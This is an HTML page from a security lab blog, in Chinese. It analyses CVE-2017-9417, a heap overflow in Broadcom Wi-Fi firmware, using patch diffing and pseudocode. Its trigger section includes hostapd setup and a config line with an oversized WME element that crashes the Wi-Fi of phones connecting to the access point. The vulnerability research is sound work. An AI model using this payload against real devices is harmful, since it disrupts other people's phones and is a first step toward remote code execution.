@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<!--[if IE 8]> <html lang="en" class="ie8 no-js"> <![endif]-->
+<!--[if IE 9]> <html lang="en" class="ie9 no-js"> <![endif]-->
+<!--[if !IE]><!-->
+<html lang="en">
+<!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <title>BROADCOM WI-FI芯片漏洞分析二 | 伏宸安全实验室-Future-Sec Information Security Lab</title>
+
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+  <meta name="description" content="前言上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。1、首先是定位到帧提取函数2、这个定位方式根据Project Zero的提示参考到bcm_parse_tlvs源码，然后在这部分源码中找到明显字符串，这里我找到的是“%04”，在rom.bin中字符串参考可以找到字符串位置。然后仔细看上下一些函数就能找到我们需要的b">
+<meta name="keywords" content="Poc,BROADCOM WI-FI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BROADCOM WI-FI芯片漏洞分析二">
+<meta property="og:url" content="http://www.future-sec.com/broadcom-wifi-2.html">
+<meta property="og:site_name" content="伏宸安全实验室-Future-Sec Information Security Lab">
+<meta property="og:description" content="前言上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。1、首先是定位到帧提取函数2、这个定位方式根据Project Zero的提示参考到bcm_parse_tlvs源码，然后在这部分源码中找到明显字符串，这里我找到的是“%04”，在rom.bin中字符串参考可以找到字符串位置。然后仔细看上下一些函数就能找到我们需要的b">
+<meta property="og:image" content="http://www.future-sec.com/images/wifi6.png">
+<meta property="og:image" content="http://www.future-sec.com/images/wifi7.png">
+<meta property="og:image" content="http://www.future-sec.com/images/wifi8.png">
+<meta property="og:image" content="http://www.future-sec.com/images/wifi9.png">
+<meta property="og:image" content="http://www.future-sec.com/images/wifi10.png">
+<meta property="og:image" content="http://www.future-sec.com/images/wifi11.png">
+<meta property="og:image" content="http://www.future-sec.com/images/wifi12.png">
+<meta property="og:image" content="http://www.future-sec.com/images/wifi13.png">
+<meta property="og:image" content="http://www.future-sec.com/images/wifi14.png">
+<meta property="og:image" content="http://www.future-sec.com/images/wifi15.png">
+<meta property="og:updated_time" content="2017-08-30T09:01:17.389Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BROADCOM WI-FI芯片漏洞分析二">
+<meta name="twitter:description" content="前言上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。1、首先是定位到帧提取函数2、这个定位方式根据Project Zero的提示参考到bcm_parse_tlvs源码，然后在这部分源码中找到明显字符串，这里我找到的是“%04”，在rom.bin中字符串参考可以找到字符串位置。然后仔细看上下一些函数就能找到我们需要的b">
+<meta name="twitter:image" content="http://www.future-sec.com/images/wifi6.png">
+  
+    <link rel="alternative" href="/atom.xml" title="伏宸安全实验室-Future-Sec Information Security Lab" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  
+
+  <!-- Global styles START -->   
+  <link rel="stylesheet" href="/metronic/assets/plugins/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/metronic/assets/plugins/bootstrap/css/bootstrap.min.css">
+  <!-- Global styles END --> 
+   
+  <!-- Page level plugin styles START -->
+  <link rel="stylesheet" href="/metronic/assets/pages/css/animate.css">
+  <link rel="stylesheet" href="/metronic/assets/plugins/owl.carousel/assets/owl.carousel.css">
+  <!-- Page level plugin styles END -->
+
+  <!-- Theme styles START -->
+  <link rel="stylesheet" href="/metronic/assets/pages/css/components.css">
+  <link rel="stylesheet" href="/metronic/assets/pages/css/slider.css">
+  <link rel="stylesheet" href="/metronic/assets/corporate/css/style.css">
+  <link rel="stylesheet" href="/metronic/assets/pages/css/portfolio.css">
+  <link rel="stylesheet" href="/metronic/assets/corporate/css/style-responsive.css">
+  <link rel="stylesheet" href="/metronic/assets/corporate/css/themes/red.css">
+  <link rel="stylesheet" href="/css/theme-styles.css">
+  <!-- Theme styles END -->
+</head>
+</html>
+<body class="corporate">
+  <!-- BEGIN HEADER -->
+<div class="header">
+  <div class="container">
+    <!--<a class="site-logo" href="/" id="logo">伏宸安全实验室-Future-Sec Information Security Lab</a>-->
+
+    <a class="site-logo" href="/">
+      <img src="/metronic/assets/corporate/img/logos/logo-corp-red.png" alt="Metronic FrontEnd">
+    </a>
+
+    <a href="javascript:void(0);" class="mobi-toggler"><i class="fa fa-bars"></i></a>
+
+    <!-- BEGIN NAVIGATION -->
+    <div class="header-navigation pull-right font-transform-inherit">
+      <ul>
+	
+	<li class="">
+	  <a href="/index.html">Home</a>
+	</li>
+	
+	<li class="">
+	  <a href="/archives/">Blog</a>
+	</li>
+	
+	<li class="">
+	  <a href="/vulnerabilities.html">Vulnerabilities</a>
+	</li>
+	
+	<li class="">
+	  <a href="/about/">About</a>
+	</li>
+	
+	<!-- BEGIN TOP SEARCH -->
+	<li class="menu-search">
+	  <span class="sep"></span>
+	  <i class="fa fa-search search-btn"></i>
+	  <div class="search-box">
+	   
+	    <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank" class="search-form">
+    <div class="input-group">
+		<input placeholder="Search" class="form-control st-default-search-input" name="word" maxlength="20" type="search">
+		  <input name="si" value="future-sec.com" type="hidden">
+  <input name="tn" value="bds" type="hidden">
+  <input name="cl" value="3" type="hidden">
+  <input name="ct" value="2097152" type="hidden">
+  <input name="s" value="on" type="hidden">
+		<span class="input-group-btn">
+		  <button class="btn btn-primary" type="submit">Search</button>
+		</span>
+	      </div>
+</form>
+	  </div> 
+	</li>
+	<!-- END TOP SEARCH -->
+      </ul>
+    </div>
+    <!-- END NAVIGATION -->
+  </div>
+</div>
+<!-- Header END -->
+
+  <div class="container">
+  <ul class="breadcrumb">
+    <li><a href="/">Home</a></li>
+    <li><a href="/archives/">Blog</a></li>
+    <li class="active">Post</li>
+  </ul>
+  <section id="main">
+    
+    <h2 itemprop="name">
+      <a class="article-title" href="/broadcom-wifi-2.html">BROADCOM WI-FI芯片漏洞分析二</a>
+    </h2>
+
+
+    <div class="row">
+<div class="col-md-9 col-sm-9 blog-posts">
+<article id="post-broadcom-wifi-2" class="article article-type-post blog-item" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+  </div>
+  <div class="article-inner">
+    
+    
+    <header class="article-header">
+      <ul class="blog-info">
+	<li><i class="fa fa-user"></i> Crystal</li>
+	<li><i class="fa fa-calendar"></i>
+	  <time datetime="2017-08-29T16:00:00.000Z" itemprop="datePublished">2017/08/30</time>
+
+	</li>
+	<li class="hidden-xs"><i class="fa fa-comments"></i>
+	  <a href="http://www.future-sec.com/broadcom-wifi-2.html#disqus_thread" class="article-comment-link">Comments</a>
+	</li>
+	<li class="hidden-xs"><i class="fa fa-tags"></i> 
+	  
+  
+    <a href="/tags/Poc/" title="Poc">Poc</a>,
+  
+    <a href="/tags/BROADCOM-WI-FI/" title="BROADCOM WI-FI">BROADCOM WI-FI</a>
+  
+
+
+	</li>
+      </ul>
+      
+  <div class="article-category">
+    
+    Category: 
+    
+    <a class="article-category-link" href="/categories/BROADCOM-WI-FI/">BROADCOM WI-FI</a>
+  </div>
+  <br>
+
+
+    </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      <!-- Table of Contents -->
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#切入主题"><span class="toc-number">2.</span> <span class="toc-text">切入主题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-9417漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">CVE-2017-9417漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析ROM固件找到漏洞"><span class="toc-number">3.1.</span> <span class="toc-text">分析ROM固件找到漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#触发漏洞"><span class="toc-number">3.3.</span> <span class="toc-text">触发漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+  </div>
+
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。<br>1、首先是定位到帧提取函数<br>2、这个定位方式根据Project Zero的提示参考到bcm_parse_tlvs源码，然后在这部分源码中找到明显字符串，这里我找到的是“%04”，在rom.bin中字符串参考可以找到字符串位置。然后仔细看上下一些函数就能找到我们需要的bcm_parse_tlvs函数。上篇文章已经给出了具体伪代码示例。这里就不再赘述。<br>3、定位到函数之后我们可以根据Project Zero 提供的高级逻辑在ida中定位到相关位置。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">uint8_t* buffer = malloc(<span class="number">256</span>);</div><div class="line">uint8_t* pos = buffer;</div><div class="line"><span class="comment">//Copying the initial (static) information</span></div><div class="line">uint8_t* linkid_ie = bcm_parse_tlvs(..., <span class="number">101</span>);</div><div class="line">memcpy(pos, linkid_ie + <span class="number">0x8</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;   <span class="comment">//Initiator MAC</span></div><div class="line">memcpy(pos, linkid_ie + <span class="number">0xE</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;    <span class="comment">//Responder MAC</span></div><div class="line">*pos = transaction_seq;             pos++;                   <span class="comment">//TransactionSeq</span></div><div class="line">memcpy(pos, linkid_ie, <span class="number">0x14</span>);       pos += <span class="number">0x14</span>;             <span class="comment">//LinkID-IE</span></div><div class="line"><span class="comment">//Copying the RSN IE</span></div><div class="line">uint8_t* rsn_ie = bcm_parse_tlvs(..., <span class="number">48</span>);</div><div class="line"><span class="keyword">if</span> (rsn_ie[<span class="number">1</span>] + <span class="number">2</span> + (pos - buffer) &gt; <span class="number">0xFF</span>) &#123;</div><div class="line">    ... <span class="comment">//Handle overflow</span></div><div class="line">&#125;</div><div class="line">memcpy(pos, rsn_ie, rsn_ie[<span class="number">1</span>] + <span class="number">2</span>); pos += rsn_ie[<span class="number">1</span>] + <span class="number">2</span>;    <span class="comment">//RSN-IE</span></div><div class="line"><span class="comment">//Copying the remaining IEs</span></div><div class="line">uint8_t* timeout_ie = bcm_parse_tlvs(..., <span class="number">56</span>);</div><div class="line">uint8_t* ft_ie      = bcm_parse_tlvs(..., <span class="number">55</span>);</div><div class="line">memcpy(pos, timeout_ie, <span class="number">0x7</span>);       pos += <span class="number">0x7</span>;              <span class="comment">//Timeout Interval IE</span></div><div class="line">memcpy(pos, ft_ie, <span class="number">0x54</span>);           pos += <span class="number">0x54</span>;             <span class="comment">//Fast-Transition IE</span></div></pre></td></tr></table></figure></p>
+<p>到这里就不再继续解释了。如果还有地方不清楚可以提出疑问。</p>
+<h2 id="切入主题"><a href="#切入主题" class="headerlink" title="切入主题"></a>切入主题</h2><p>1、本篇文章主要核心是侧重CVE-2017-9417的漏洞分析和利用。<br>2、涉及到的相关知识将以链接形式详细给出</p>
+<h2 id="CVE-2017-9417漏洞分析"><a href="#CVE-2017-9417漏洞分析" class="headerlink" title="CVE-2017-9417漏洞分析"></a>CVE-2017-9417漏洞分析</h2><h3 id="分析ROM固件找到漏洞"><a href="#分析ROM固件找到漏洞" class="headerlink" title="分析ROM固件找到漏洞"></a>分析ROM固件找到漏洞</h3><p>1、一种方式是七月分打过补丁的Rom固件跟六月份没打补丁的利用 BinDiff （安装到IDA目录下在IDA中以插件形式执行，Crtl+6使用）对比，看修改了哪个补丁。最后可以找到漏洞函数wlc_bss_parse_wme_ie。这个函数用来处理关联、重新关联和信标包。这些信标包包含信息元素，包含Wi-Fi标准扩展的数据。每个信息元素（IE）的格式是：<br>type (1 byte), length (1 byte), data of (length) bytes<br>2、这个函数功能用来处理服务质量扩展的WME信息元素。下图是WME信息元素的格式：<br><img src="/images/wifi6.png" alt="img"><br>3、定位漏洞函数<br>·    bindiff对比6月份补丁跟7月份补丁的差异<br>·    第一步：将两个补丁版本都dump下来。<br>·    第二步：安装bindiff 到 ida 目录。安装方式，这里提供windows下安装包bindiff<br>·    第三步：先用ida打开7月份补丁，分析固件补丁时要注意它在内存中的存储位置，在上篇文章中我们提到ram在安卓系统内存中加载起始地址在0x180000.所以我们需要在ida加载时手动设置加载起始位置。并将分析好的数据保存数据库idb文件来方便我们跟6月份版本做对比。具体配置如下：<br><img src="/images/wifi7.png" alt="img"><br><img src="/images/wifi8.png" alt="img"><br>·    第四步：同样方式打开6月份补丁文件，Crtl+6启动bindiff插件，选择我们上一步保存的idb文件，可以对比分析两个版本有什么不同。<br>    跟踪到造成漏洞的函数。<br> <img src="/images/wifi9.png" alt="img"><br><img src="/images/wifi10.png" alt="img">   </p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>·该函数在关联/重新关联响应帧部分出现bug，它将接收到的ie复制到24（0x18）字节长的预分配缓冲区，大小适合最大的有效WME信息元素长度，但是使用信息元素头的长度可以高达255（0xff），创建一个堆在外边界写入231个字节，可造成溢出。 分析wlc_bss_parse_wme_ie漏洞函数。<br>assocresp_ies数据<br><img src="/images/wifi11.png" alt="img"><br>分析数据包信息大致理解关联帧IE的0x0c头部信息暂时理解为特定供应商标签。<br><img src="/images/wifi12.png" alt="img"><br>如下图比较可以看到修补bug前，没有对wme大小进行校验直接拷贝到预分配的缓冲区。<br><img src="/images/wifi13.png" alt="img"><br>缓冲区分配ida中参考在<a href="http://note.youdao.com/noteshare?id=7cb193be6f06643ef49f5f780bdb78c9" rel="external nofollow noopener noreferrer" target="_blank">这里</a></p>
+<h3 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h3><p>这个bug很容易复现，因为最新版的Hostapd 支持自定义信息元素。<br>hostapd 安装：链接</p>
+<ol>
+<li>下载hostapd到ubuntu 14.04</li>
+<li>解压hostapd</li>
+<li>配置hostapd，使它编译为支持nl80211驱动<br>cp defconfig .config<br>vi .config #找到“#CONFIG_DRIVER_NL80211=y”，去掉“#”符号。保存。</li>
+<li>make #编译hostapd ，编译过程会报错，是因为缺少libnl库<br><img src="/images/wifi14.png" alt="img"><br>解决方法：下载并编译安装libnl 可以到主页下载：<a href="http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：" rel="external nofollow noopener noreferrer" target="_blank">http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：</a><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git <span class="keyword">clone</span> git:<span class="comment">//github.com/tgraf/libnl-1.1-stable.git</span></div><div class="line">cd libnl<span class="number">-1.1</span>-stable</div><div class="line">./configure</div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>5、make编译<br><img src="/images/wifi15.png" alt="img"><br>在启动hostapd时指定配置文件<br>1、新建配置文件 在/etc/目录新建一个文件hostapd.conf<br>2、配置文件内容<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># WiFi Hotspot</div><div class="line">interface=wlan0</div><div class="line">driver=nl80211</div><div class="line">#Access Point</div><div class="line">ssid=YourNetworkNameHere</div><div class="line">hw_mode=g</div><div class="line"># WiFi Channel:</div><div class="line">channel=1</div><div class="line">macaddr_acl=0</div><div class="line">auth_algs=1</div><div class="line">ignore_broadcast_ssid=0</div><div class="line"></div><div class="line">assocresp_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div><div class="line">vendor_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div></pre></td></tr></table></figure></p>
+<p>1.interface：接入点设备名称，注意不要包含ap后缀，即如果该设备称为wlan0ap，填写wlan0即可；<br>2.driver：设定无线驱动，我这里是nl80211；<br>3.ssid: 设置名字(SSID = service set identifier) ,老版本(iwconfig)叫”essid”.<br>4.hw_mode: 设置操作mode,channels.有效的值取决于硬件,通常:a, b, g. ‘g’大多数都支持, 并向前兼容802.11b<br>5.channel:设置hostapd操作的channel.<br>6.ignore_broadcast_ssid: 开启或禁用广播ssid.<br>7.macaddr_acl: MAC地址过滤. .<br>8.auth_algs: 指定采用哪种认证算法，采用位域（bit fields）方式来制定，其中第一位表示开放系统认证（Open System Authentication, OSA），第二位表示共享密钥认证（Shared Key Authentication, SKA）。我这里设置alth_algs的值为1，表示只采用OSA；如果为3则两种认证方式都支持。 9.assocresp_elements:关联响应帧的附加供应商特定信息（翻译过来中文参考，不确定是否正确） 10.vendor_elements：信标和探测响应帧的附加供应商特定元素（翻译过来中文参考，不确定是否正确）<br>3、启动 hostpad<br>1.启动<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
+<p>2.启动过程如果出现“Interface wlan0 wasn’t started”错误，先运行下面2行命令<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo nmcli nm wifi off</div><div class="line">sudo rfkill unblock wlan</div></pre></td></tr></table></figure></p>
+<p>然后继续执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
+<p>3.目标手机连上指定开启的wifi名称为“YourNetworkNameHere”的wifi，即可看到漏洞被触发，wifi重启。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面已经了解了漏洞的成因，和简单复现了漏洞。接下来我们要做的是利用漏洞做些事情。后续继续分析将详细给出exploit的编写方法。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1、Ubuntu上编译hostapd：<a href="http://blog.csdn.net/hnllc2012/article/details/49151137" rel="external nofollow noopener noreferrer" target="_blank">http://blog.csdn.net/hnllc2012/article/details/49151137</a><br>2、博客参考：<a href="http://boosterok.com/blog/broadpwn1/" rel="external nofollow noopener noreferrer" target="_blank">http://boosterok.com/blog/broadpwn1/</a></p>
+
+      
+    </div>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/broadcom-wifi-1.html" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          BROADCOM WI-FI芯片漏洞分析一
+        
+      </div>
+    </a>
+  
+  
+    <a href="/f-middlewarescan.html" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">中间件漏洞检测框架(F-MiddlewareScan)</div>
+    </a>
+  
+</nav>
+
+  
+  <br>
+</article>
+
+
+
+
+</div>
+<div class="col-md-3 col-sm-3 blog-sidebar">
+  <!-- CATEGORIES START -->
+<h2 class="no-top-space">Categories</h2>
+
+<div class="widget-wrap">
+  <div class="widget">
+    <ul class="nav sidebar-categories margin-bottom-40">
+      
+	<li>
+	  <a href="/categories/硬件安全/">硬件安全 (1)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/web安全/">web安全 (2)</a>
+	</li>
+      
+	<li>
+	  <a href="/categories/BROADCOM-WI-FI/">BROADCOM WI-FI (2)</a>
+	</li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<!-- CATEGORIES END -->
+
+<!-- BEGIN BLOG TAGS -->
+<div class="blog-tags margin-bottom-20">
+  <h2>Tags</h2>
+  
+  <div class="widget-wrap">
+    <div class="widget">
+      
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BROADCOM-WI-FI/"><i class="fa fa-tags"></i>BROADCOM WI-FI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Poc/"><i class="fa fa-tags"></i>Poc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/"><i class="fa fa-tags"></i>python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/条形码/"><i class="fa fa-tags"></i>条形码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/硬件安全/"><i class="fa fa-tags"></i>硬件安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/自动化检测/"><i class="fa fa-tags"></i>自动化检测</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/验证码/"><i class="fa fa-tags"></i>验证码</a></li></ul>
+    </div>
+  </div>
+
+
+</div>
+<!-- END BLOG TAGS -->
+
+
+<!-- BEGIN FEATURED POSTS -->                            
+<h2>Featured Posts</h2>
+<div class="recent-news margin-bottom-10">
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+</div>
+<!-- END FEATURED POSTS -->                            
+
+</div>
+</div>
+
+  </section>
+</div>
+
+    <!-- BEGIN PRE-FOOTER -->
+    <div class="pre-footer">
+      <div class="container">
+        <div class="row">
+          <!-- BEGIN BOTTOM ABOUT BLOCK -->
+          <div class="col-md-4 col-sm-6 pre-footer-col">
+            <h2>About Us</h2>
+            <p>伏宸安全实验室<br><br> 伏宸安全实验室是广东安创信息科技开发有限公司旗下的以网络安全研究为核心的专业实验室，主攻前沿安全技术，包括：渗透测试、黑产对抗、威胁情报、智能硬件与无线电安全等。</p>
+          </div>
+          <!-- END BOTTOM ABOUT BLOCK -->
+
+          <!-- BEGIN BOTTOM CONTACTS -->
+          <div class="col-md-4 col-sm-6 pre-footer-col">
+            <h2>Contact</h2>
+            <address class="margin-bottom-40">
+              广州市越秀区寺右新马路108号丰伟大厦15B、C单元<br>
+              BC 15/F Fengwei Buiding NO.108 Siyouxinma Road<br>
+              Guangzhou,China Code:510600<br>
+              Phone: 020-87392713<br>
+              Email: <a href="mailto:admin@future-sec.com" rel="external nofollow noopener noreferrer" target="_blank">admin@future-sec.com</a><br>
+            </address>
+          </div>
+          <!-- END BOTTOM CONTACTS -->
+
+	
+        </div>
+      </div>
+    </div>
+    <!-- END PRE-FOOTER -->
+
+    <!-- BEGIN FOOTER -->
+    <div class="footer">
+      <div class="container">
+        <div class="row">
+          <!-- BEGIN COPYRIGHT -->
+          <div class="col-md-6 col-sm-6 padding-top-10">
+                  &copy; 2017 伏宸安全实验室-Future-Sec Information Security Lab<br>
+ <a href="javascript:;">Future-sec</a> | <a href="javascript:;">广东安创信息科技开发有限公司</a>
+          </div>
+          <!-- END COPYRIGHT -->
+	  <!-- BEGIN SOCIAL -->
+<div class="col-md-6 col-sm-6">
+  <ul class="social-footer list-unstyled list-inline pull-right">
+    
+      <li><a href="https://github.com/Future-Sec/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-github"></i></a></li>
+    
+      <li><a href="https://weibo.com/futures-sec" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-weibo"></i></a></li>
+    
+      <li><a href="https://mp.weixin.qq.com/s/QuDKBrMist8GL16EEO-u4Q" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-weixin"></i></a></li>
+    
+      <li><a href="/atom.xml"><i class="fa fa-rss"></i></a></li>
+    
+  </ul>  
+</div>
+<!-- END SOCIAL -->
+
+        </div>
+      </div>
+    </div>
+    <!-- END FOOTER -->
+
+  <!-- BEGIN CORE PLUGINS (REQUIRED FOR ALL PAGES) -->
+<!--[if lt IE 9]>
+<script src="/metronic/assets/plugins/respond.min.js"></script>
+<![endif]--> 
+<script src="/metronic/assets/plugins/jquery.min.js"></script>
+<script src="/metronic/assets/plugins/jquery-migrate.min.js"></script>
+<script src="/metronic/assets/plugins/bootstrap/js/bootstrap.min.js"></script>
+<script src="/metronic/assets/corporate/scripts/back-to-top.js"></script>
+<script src="/metronic/assets/plugins/owl.carousel/owl.carousel.min.js"></script>
+<script src="/metronic/assets/corporate/scripts/layout.js"></script>
+<script src="/js/wow.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script type="text/javascript">
+    jQuery(document).ready(function() {
+        Layout.init();    
+        Layout.initOWL();
+        Layout.initFixHeaderWithPreHeader(); /* Switch On Header Fixing (only if you have pre-header) */
+        Layout.initNavScrolling(); 
+	new WOW().init();
+    });
+</script>
+ <script>
+        // 给图片添加链接
+        $(document).ready(function() {
+            $("p img").each(function() {
+                var strA = "<a class='fancybox' href='" + this.src + "'></a>";
+                $(this).wrapAll(strA);
+            });
+        });
+    
+        // fancybox
+        $(".fancybox").fancybox({
+                                  openEffect    : 'elastic',
+                                  closeEffect   : 'elastic',
+                              });
+    </script>
+    <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?9e36ea61528e32ab9a0bc86aa61db5f7";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<!-- END CORE PLUGINS -->
+
+<!-- BEGIN PAGE-SPECIFIC PLUGINS --> 
+
+
+
+
+
+
+
+<!-- END PAGE-SPECIFIC PLUGINS --> 
+
+<!-- BEGIN INTEGRATIONS -->
+
+
+
+
+
+<!-- END INTEGRATIONS -->
+
+</body>
+
